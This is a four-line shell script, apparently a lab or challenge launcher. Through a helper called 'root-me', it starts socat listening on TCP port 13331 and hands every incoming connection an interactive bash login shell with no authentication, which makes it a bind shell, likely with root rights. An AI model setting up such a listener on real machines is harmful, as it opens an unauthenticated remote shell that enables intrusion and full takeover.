#!/bin/sh

export PATH=$PATH:$PWD/bin
root-me $PWD/bin/socat tcp-listen:13331 exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane
